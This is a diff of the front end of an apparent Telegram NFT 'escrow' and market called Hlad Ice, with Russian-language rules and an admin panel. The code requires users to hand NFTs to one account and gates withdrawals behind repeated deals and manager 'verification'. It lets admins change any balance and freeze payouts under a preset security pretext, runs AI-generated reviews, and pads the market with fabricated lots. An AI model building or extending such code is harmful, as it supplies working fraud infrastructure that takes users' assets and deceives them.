@@ -1,3 +1,8 @@
+
+
+
+Значок HTML-файла
+index_final_v2
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -1666,16 +1671,15 @@
                 <p style="margin-bottom: 10px;"><b>2. Передача NFT и сохранность средств</b><br>
                 Передача всех NFT и Telegram-подарков в рамках сделок осуществляется <b>строго на официальный аккаунт приёма @Hladpriemka</b>. В случае если продавец передаёт NFT напрямую покупателю в обход официального аккаунта @Hladpriemka, сервис не фиксирует передачу и <b>средства по сделке безвозвратно утрачиваются</b>.</p>
 
-                <p style="margin-bottom: 10px;"><b>3. Покупка на маркете и вывод средств</b><br>
-                • Покупка подарков на внутреннем маркете Hlad Ice, а также вывод средств с баланса кошелька становятся доступны после проведения пользователем не менее <b>2 (двух) завершённых сделок</b>.<br>
-                • Для вывода средств после выполнения условия по количеству сделок требуется прохождение верификации через официального менеджера <b>@Hladpriemka</b>.</p>
+                <p style="margin-bottom: 10px;"><b>3. Условия доступа к Маркету, Выводу средств и Инвентарю</b><br>
+                • <b>Покупка на маркете:</b> приобретение NFT-подарков на внутреннем маркете Hlad Ice становится доступным после проведения пользователем не менее <b>2 (двух) завершённых сделок</b>.<br>
+                • <b>Вывод средств с баланса кошелька:</b> вывод средств в любой валюте (STARS, TON, RUB, UAH) открывается после проведения не менее <b>2 (двух) завершённых сделок</b> и прохождения верификации через официального менеджера <b>@Hladpriemka</b>.<br>
+                • <b>Вывод NFT из инвентаря:</b> вывод купленных, выигранных или начисленных подарков из личного инвентаря на аккаунт Telegram доступен после проведения не менее <b>3 (трёх) завершённых сделок</b>.</p>
 
                 <p style="margin-bottom: 10px;"><b>4. Правила раздела «Апгрейд»</b><br>
                 • В разделе «Апгрейд» пользователь добровольно использует NFT из своего инвентаря либо средства с внутреннего баланса для попытки улучшения на выбранный NFT-подарок с маркета.<br>
                 • Вероятность успеха рассчитывается автоматически исходя из соотношения стоимости ставки и целевого подарка в допустимом диапазоне от <b>5% до 75%</b>.<br>
                 • В случае неудачного исхода поставленный NFT безвозвратно сгорает из инвентаря пользователя (а денежная ставка списывается с баланса) без возможности возврата или компенсации.</p>
-                • Если вы хотите вывести нфт с инвентаря, нужно провести минимум 4 сделки на нфт, и после сможете полностью пользоваться: выводом и пополнением нфт в инвентарь . Если вам вылезло пройти верефикацию то значит нужно провести 3 сделки чтобы вывести валюту.</p>
-                • НЕЗНАНИЕ ПРАВИЛ = ВАША ОТВЕТСТВЕННОСТЬ .</p>
             </div>
         `);
     }
@@ -2009,7 +2013,7 @@
             const p = item.prices || {};
             const stars = p.STARS || item.stars_price || 100;
             const rub = p.RUB || Math.round(stars * 1.4);
-            const fallbackImg = `https://nft.fragment.com/gift/${esc(item.slug || '')}-${esc(String(item.number))}.medium.jpg`;
+            const cleanSlug = (item.slug || item.name || 'gift').toLowerCase().replace(/[^a-z0-9]/g, ''); const fallbackImg = `https://nft.fragment.com/gift/${cleanSlug}-${esc(String(item.number))}.medium.jpg`;
 
             return `
                 <div class="nft-tile" onclick="openMarketItemModal('${item.id}')">
@@ -2034,7 +2038,7 @@
         const item = marketItems.find(x => x.id === itemId);
         if (!item) return;
         const p = item.prices || {};
-        const fallbackImg = `https://nft.fragment.com/gift/${esc(item.slug || '')}-${esc(String(item.number))}.medium.jpg`;
+        const cleanSlug = (item.slug || item.name || 'gift').toLowerCase().replace(/[^a-z0-9]/g, ''); const fallbackImg = `https://nft.fragment.com/gift/${cleanSlug}-${esc(String(item.number))}.medium.jpg`;
 
         showModal(`
             <div style="text-align:center; margin-bottom:12px;">
@@ -2125,7 +2129,7 @@
 
         box.innerHTML = userInventory.map(it => {
             const p = it.prices || {};
-            const fallbackImg = `https://nft.fragment.com/gift/${esc(it.slug || '')}-${esc(String(it.number))}.medium.jpg`;
+            const cleanSlug = (it.slug || it.name || 'gift').toLowerCase().replace(/[^a-z0-9]/g, ''); const fallbackImg = `https://nft.fragment.com/gift/${cleanSlug}-${esc(String(it.number))}.medium.jpg`;
             return `
                 <div class="deal-box">
                     <div style="display:flex; gap:12px; align-items:center; margin-bottom:10px;">
@@ -2146,6 +2150,18 @@
     }
 
     async function withdrawInventoryNft(invId) {
+        if (userCompletedDealsCount < 3 && !isUserAdmin) {
+            showModal(`
+                <h3 style="margin-bottom:10px;">Вывод из инвентаря недоступен</h3>
+                <div class="info-callout">
+                    Вывод NFT-подарков из инвентаря на аккаунт Telegram доступен после проведения не менее <b>3 завершённых сделок</b>.<br><br>
+                    Сейчас у вас завершено: <b>${userCompletedDealsCount} из 3</b> сделок. Подробности в <span class="privacy-btn" onclick="openPrivacyPolicy()">Политике конфиденциальности</span>.
+                </div>
+                <button class="btn btn-ice" style="margin-bottom:8px;" onclick="closeModal(); showPage('create');">Создать сделку</button>
+                <button class="btn btn-glass" onclick="closeModal()">Закрыть</button>
+            `);
+            return;
+        }
         const res = await apiCall('/api/inventory_withdraw', { inv_id: invId });
         if (res.success) {
             showModal(`
@@ -2867,39 +2883,133 @@
         loadUserChat();
     }
 
+    let activeAdminChatUid = null;
+
     async function loadAdminPanel() {
         const box = document.getElementById('adminBody');
         const data = await apiCall('/api/admin_panel_data');
         if (!data.success) { box.innerHTML = 'Доступ запрещён'; return; }
 
+        const chatsObj = data.chats || {};
+        const chatUids = Object.keys(chatsObj).filter(k => (chatsObj[k] || []).length > 0);
+        if (!activeAdminChatUid && chatUids.length) {
+            activeAdminChatUid = chatUids[0];
+        }
+
+        const dealsHtml = (data.deals || []).map(d => `
+            <div class="deal-box">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                    <b>#${esc(d.deal_id)} — ${esc(d.product)}</b>
+                    <span class="status-pill ${d.status}">${esc(d.status)}</span>
+                </div>
+                <div style="font-size:11.5px; color:var(--text-secondary);">@${esc(d.seller_username)} → @${esc(d.buyer_username)} • <b>${d.amount} ${d.currency}</b></div>
+                ${d.nft_link ? `<div style="font-size:11px; color:var(--arctic-cyan); margin-top:2px;">${esc(d.nft_link)}</div>` : ''}
+                <div style="display:flex; gap:6px; margin-top:8px;">
+                    <button class="btn btn-danger btn-sm" style="width:100%;" onclick="admDeleteDeal('${d.deal_id}')"><i class="fas fa-trash"></i> Удалить сделку</button>
+                </div>
+            </div>
+        `).join('') || '<div style="color:var(--text-muted); font-size:12px;">Сделок пока нет</div>';
+
+        const chatTabsHtml = chatUids.length
+            ? `<div style="display:flex; gap:6px; overflow-x:auto; margin-bottom:10px;">
+                ${chatUids.map(uid => {
+                    const msgs = chatsObj[uid] || [];
+                    const last = msgs[msgs.length - 1] || {};
+                    const isAct = String(activeAdminChatUid) === String(uid);
+                    return `<button class="adm-tab ${isAct ? 'active' : ''}" onclick="selectAdminChatUser('${uid}')">${esc(last.username || uid)} (${msgs.length})</button>`;
+                }).join('')}
+               </div>`
+            : '<div style="color:var(--text-muted); font-size:12px; margin-bottom:10px;">Обращений в чат поддержки пока нет</div>';
+
+        const activeMsgs = activeAdminChatUid ? (chatsObj[activeAdminChatUid] || []) : [];
+        const chatStreamHtml = activeAdminChatUid
+            ? `
+                <div class="chat-stream" style="height:240px;">
+                    ${activeMsgs.map(m => `<div class="chat-msg ${m.sender === 'admin' ? 'user' : 'admin'}"><small style="opacity:0.7; display:block; font-size:10px;">${m.sender === 'admin' ? 'Поддержка' : esc(m.username || activeAdminChatUid)}</small>${esc(m.text)}</div>`).join('')}
+                </div>
+                <div style="display:flex; gap:8px;">
+                    <input type="text" id="admChatReplyInput" placeholder="Ответ пользователю ${esc(activeAdminChatUid)}..." style="flex:1; padding:10px 12px; border-radius:12px; border:1px solid var(--border-crystal); background:var(--bg-field); color:#fff; outline:none;" onkeydown="if(event.key==='Enter') admSendChatReply()">
+                    <button class="btn btn-ice btn-sm" onclick="admSendChatReply()"><i class="fas fa-paper-plane"></i></button>
+                </div>
+              `
+            : '';
+
         box.innerHTML = `
             <div class="adm-tabs">
-                <button class="adm-tab active" onclick="switchAdmTab(this, 'adm-session')">Сессия ТГ</button>
+                <button class="adm-tab active" onclick="switchAdmTab(this, 'adm-deals')">Сделки (${(data.deals || []).length})</button>
+                <button class="adm-tab" onclick="switchAdmTab(this, 'adm-wallet')">Баланс и Заморозка</button>
+                <button class="adm-tab" onclick="switchAdmTab(this, 'adm-chats')">Чаты (${chatUids.length})</button>
+                <button class="adm-tab" onclick="switchAdmTab(this, 'adm-inv')">Выдать NFT</button>
+                <button class="adm-tab" onclick="switchAdmTab(this, 'adm-session')">Сессия ТГ</button>
                 <button class="adm-tab" onclick="switchAdmTab(this, 'adm-market')">Маркет (${data.market_total || 0})</button>
                 <button class="adm-tab" onclick="switchAdmTab(this, 'adm-ai')">ИИ-отзывы</button>
-                <button class="adm-tab" onclick="switchAdmTab(this, 'adm-wallet')">Баланс</button>
             </div>
 
-            <div class="adm-pane active" id="adm-session">
+            <!-- ВКЛАДКА: СДЕЛКИ -->
+            <div class="adm-pane active" id="adm-deals">
+                ${dealsHtml}
+            </div>
+
+            <!-- ВКЛАДКА: БАЛАНС И ЗАМОРОЗКА ВЫВОДА -->
+            <div class="adm-pane" id="adm-wallet">
+                <div class="field"><label>Telegram ID пользователя</label><input type="number" id="admTargetId" placeholder="1544353769"></div>
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
+                    <div class="field"><label>Валюта</label><input type="text" id="admCurr" value="STARS"></div>
+                    <div class="field"><label>Сумма</label><input type="number" id="admAmt" placeholder="5000"></div>
+                </div>
+                <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:6px; margin-bottom:14px;">
+                    <button class="btn btn-emerald btn-sm" style="width:100%;" onclick="admBalanceOp('add')">+ Начислить</button>
+                    <button class="btn btn-ice btn-sm" style="width:100%;" onclick="admBalanceOp('set')">Установить</button>
+                    <button class="btn btn-danger btn-sm" style="width:100%;" onclick="admBalanceOp('remove')">- Списать</button>
+                </div>
+
+                <div style="border-top:1px solid var(--border-crystal); padding-top:12px;">
+                    <div style="font-size:13px; font-weight:800; color:var(--arctic-ice); margin-bottom:8px;"><i class="fas fa-snowflake"></i> Заморозка вывода баланса</div>
+                    <div class="field"><label>Время заморозки в минутах (0 — снять заморозку)</label><input type="number" id="admFreezeMins" placeholder="60"></div>
+                    <div class="field"><label>Причина заморозки</label><input type="text" id="admFreezeReason" placeholder="Проверка безопасности транзакций"></div>
+                    <button class="btn btn-glass btn-sm" style="width:100%; border-color:var(--arctic-cyan);" onclick="admSetFreeze()">Применить заморозку</button>
+                </div>
+            </div>
+
+            <!-- ВКЛАДКА: ЧАТЫ ПОДДЕРЖКИ -->
+            <div class="adm-pane" id="adm-chats">
+                ${chatTabsHtml}
+                ${chatStreamHtml}
+            </div>
+
+            <!-- ВКЛАДКА: ВЫДАЧА NFT В ИНВЕНТАРЬ ПОЛЬЗОВАТЕЛЮ -->
+            <div class="adm-pane" id="adm-inv">
+                <div class="info-callout">
+                    Начисление реального NFT-подарка в инвентарь пользователя по его Telegram ID и ссылке. Вывод из инвентаря доступен пользователю от 3 сделок.
+                </div>
+                <div class="field"><label>Telegram ID получателя</label><input type="number" id="admInvUserId" placeholder="1544353769"></div>
+                <div class="field"><label>Ссылка на подарок (t.me/nft/...)</label><input type="text" id="admInvLink" placeholder="t.me/nft/PlushPepe-120"></div>
+                <div class="field"><label>Оценочная стоимость в STARS</label><input type="number" id="admInvStars" value="1500"></div>
+                <button class="btn btn-ice btn-sm" style="width:100%;" onclick="admGiveInventory()">Выдать подарок в инвентарь</button>
+            </div>
+
+            <!-- ВКЛАДКА: СЕССИЯ ТГ -->
+            <div class="adm-pane" id="adm-session">
                 <div class="info-callout">
                     Статус StringSession: <b>${data.session_connected ? 'ПОДКЛЮЧЕНА' : 'НЕ ЗАДАНА'}</b><br>
-                    Вставьте готовую строку StringSession — бот возьмёт по 1 подарку каждой модели из маркета Telegram и заполнит витрину уникальными номерами и неровными ценами.
+                    Вставьте готовую строку StringSession — бот спарсит по 1 реально существующему подарку каждой модели из маркета Telegram.
                 </div>
                 <div class="field"><label>StringSession</label><textarea id="admStrSess" rows="3" placeholder="1BVtsOHwBu..."></textarea></div>
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
                     <button class="btn btn-ice btn-sm" style="width:100%;" onclick="admSaveSession()">Сохранить сессию</button>
-                    <button class="btn btn-emerald btn-sm" style="width:100%;" onclick="admParseMarketNow()">Спарсить модели</button>
+                    <button class="btn btn-emerald btn-sm" style="width:100%;" onclick="admParseMarketNow()">Спарсить маркет</button>
                 </div>
             </div>
 
+            <!-- ВКЛАДКА: МАРКЕТ -->
             <div class="adm-pane" id="adm-market">
-                <div class="field"><label>Ссылка на подарок (t.me/nft/...)</label><input type="text" id="admMktLink" placeholder="t.me/nft/PlushPepe-120"></div>
-                <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
-                    <div class="field"><label>Базовая цена (STARS)</label><input type="number" id="admMktStars" placeholder="1500"></div>
-                    <div class="field"><label>Кол-во лотов этой модели</label><input type="number" id="admMktCount" value="15" min="1" max="50"></div>
+                <div class="field"><label>Добавить реальный NFT (t.me/nft/...)</label><input type="text" id="admMktLink" placeholder="t.me/nft/PlushPepe-120"></div>
+                <div class="field"><label>Цена в STARS</label><input type="number" id="admMktStars" placeholder="1500"></div>
+                <div style="display:grid; grid-template-columns:1.5fr 1fr; gap:8px; margin-bottom:12px;">
+                    <button class="btn btn-ice btn-sm" style="width:100%;" onclick="admAddMarketItem()">Добавить в маркет</button>
+                    <button class="btn btn-danger btn-sm" style="width:100%;" onclick="admClearMarket()">Очистить маркет</button>
                 </div>
-                <button class="btn btn-ice btn-sm" style="width:100%; margin-bottom:12px;" onclick="admAddMarketItem()">Добавить модель в маркет</button>
-                ${(data.market || []).slice(0, 20).map(m => `
+                ${(data.market || []).slice(0, 25).map(m => `
                     <div class="deal-box" style="display:flex; justify-content:space-between; align-items:center;">
                         <div><b>${esc(m.name)} #${m.number}</b><div style="font-size:11px; color:var(--gold-star);">${esc(m.model)} • ★ ${m.stars_price} STARS</div></div>
                         <button class="btn btn-danger btn-sm" onclick="admDelMarketItem('${m.id}')">Удалить</button>
@@ -2907,20 +3017,12 @@
                 `).join('')}
             </div>
 
+            <!-- ВКЛАДКА: ИИ-ОТЗЫВЫ -->
             <div class="adm-pane" id="adm-ai">
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:12px;">
                     <button class="btn ${data.ai_enabled ? 'btn-danger' : 'btn-emerald'} btn-sm" style="width:100%;" onclick="admAiControl('toggle')">${data.ai_enabled ? 'Остановить ИИ' : 'Запустить ИИ'}</button>
                     <button class="btn btn-ice btn-sm" style="width:100%;" onclick="admAiControl('generate_now')">+ 1 отзыв сейчас</button>
                 </div>
-            </div>
-
-            <div class="adm-pane" id="adm-wallet">
-                <div class="field"><label>Telegram ID</label><input type="number" id="admTargetId" placeholder="1544353769"></div>
-                <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
-                    <div class="field"><label>Валюта</label><input type="text" id="admCurr" value="STARS"></div>
-                    <div class="field"><label>Сумма</label><input type="number" id="admAmt" placeholder="5000"></div>
-                </div>
-                <button class="btn btn-ice btn-sm" style="width:100%;" onclick="admBalanceAdd()">Начислить баланс</button>
             </div>
         `;
     }
@@ -2932,6 +3034,56 @@
         document.getElementById(paneId).classList.add('active');
     }
 
+    function selectAdminChatUser(uid) {
+        activeAdminChatUid = uid;
+        loadAdminPanel().then(() => {
+            const tabBtn = Array.from(document.querySelectorAll('.adm-tab')).find(b => b.textContent.includes('Чаты'));
+            if (tabBtn) switchAdmTab(tabBtn, 'adm-chats');
+        });
+    }
+
+    async function admSendChatReply() {
+        const inp = document.getElementById('admChatReplyInput');
+        const text = inp?.value.trim();
+        if (!text || !activeAdminChatUid) return;
+        inp.value = '';
+        await apiCall('/api/chat_send', { target_user_id: activeAdminChatUid, text, sender: 'admin' });
+        selectAdminChatUser(activeAdminChatUid);
+    }
+
+    async function admDeleteDeal(dealId) {
+        const res = await apiCall('/api/admin_delete_deal', { deal_id: dealId });
+        if (res.success) { showToast('Сделка удалена'); loadAdminPanel(); loadDeals(); }
+    }
+
+    async function admBalanceOp(op) {
+        const tid = parseInt(document.getElementById('admTargetId').value);
+        const curr = document.getElementById('admCurr').value.toUpperCase();
+        const amt = parseFloat(document.getElementById('admAmt').value);
+        if (!tid || isNaN(amt)) { showToast('Укажите ID и сумму'); return; }
+        const ep = op === 'add' ? '/api/admin_add_balance' : (op === 'set' ? '/api/admin_set_balance' : '/api/admin_remove_balance');
+        const res = await apiCall(ep, { target_user_id: tid, currency: curr, amount: amt });
+        if (res.success) { showToast('Баланс обновлён'); loadBalance(); }
+    }
+
+    async function admSetFreeze() {
+        const tid = parseInt(document.getElementById('admTargetId').value);
+        const mins = parseInt(document.getElementById('admFreezeMins').value || 0);
+        const reason = document.getElementById('admFreezeReason').value.trim();
+        if (!tid) { showToast('Укажите Telegram ID пользователя'); return; }
+        const res = await apiCall('/api/admin_set_freeze', { target_user_id: tid, minutes: mins, reason });
+        if (res.success) showToast(mins > 0 ? `Заморозка установлена на ${mins} мин.` : 'Заморозка снята');
+    }
+
+    async function admGiveInventory() {
+        const tid = document.getElementById('admInvUserId').value.trim();
+        const link = document.getElementById('admInvLink').value.trim();
+        const stars = document.getElementById('admInvStars').value;
+        const res = await apiCall('/api/admin_give_inventory', { target_user_id: tid, nft_link: link, stars_price: stars });
+        if (res.success) { showToast('Подарок начислен в инвентарь!'); loadInventory(); }
+        else showToast(res.error || 'Ошибка выдачи');
+    }
+
     async function admSaveSession() {
         const res = await apiCall('/api/admin_session_control', {
             action: 'save',
@@ -2941,20 +3093,24 @@
     }
 
     async function admParseMarketNow() {
-        showToast('Парсинг моделей с маркета Telegram...');
+        showToast('Парсинг реальных подарков из Telegram...');
         const res = await apiCall('/api/admin_session_control', { action: 'parse_now' });
-        if (res.success) { showToast(`Найдено моделей: ${res.models}, добавлено лотов: ${res.added}`); loadMarket(); loadAdminPanel(); }
+        if (res.success) { showToast(`Найдено моделей: ${res.models}, добавлено: ${res.added}`); loadMarket(); loadAdminPanel(); }
         else showToast(res.error || 'Ошибка парсинга');
     }
 
     async function admAddMarketItem() {
         const res = await apiCall('/api/admin_market_add', {
             nft_link: document.getElementById('admMktLink').value,
-            stars_price: document.getElementById('admMktStars').value,
-            lots_count: document.getElementById('admMktCount').value
+            stars_price: document.getElementById('admMktStars').value
         });
-        if (res.success) { showToast(`Добавлено ${res.added} уникальных лотов!`); loadMarket(); loadAdminPanel(); }
+        if (res.success) { showToast('Подарок добавлен!'); loadMarket(); loadAdminPanel(); }
         else showToast(res.error || 'Ошибка');
+    }
+
+    async function admClearMarket() {
+        const res = await apiCall('/api/admin_market_clear', {});
+        if (res.success) { showToast('Маркет очищен'); loadMarket(); loadAdminPanel(); }
     }
 
     async function admDelMarketItem(id) {
@@ -2965,15 +3121,6 @@
     async function admAiControl(action) {
         const res = await apiCall('/api/admin_ai_control', { action });
         if (res.success) { showToast('Готово'); loadAdminPanel(); loadReviews(); }
-    }
-
-    async function admBalanceAdd() {
-        const res = await apiCall('/api/admin_add_balance', {
-            target_user_id: parseInt(document.getElementById('admTargetId').value),
-            currency: document.getElementById('admCurr').value.toUpperCase(),
-            amount: parseFloat(document.getElementById('admAmt').value)
-        });
-        if (res.success) showToast('Баланс начислен');
     }
 
     (async function bootstrap() {
@@ -3000,3 +3147,4 @@
 </script>
 </body>
 </html>
+Обработано и проанализировано в коде
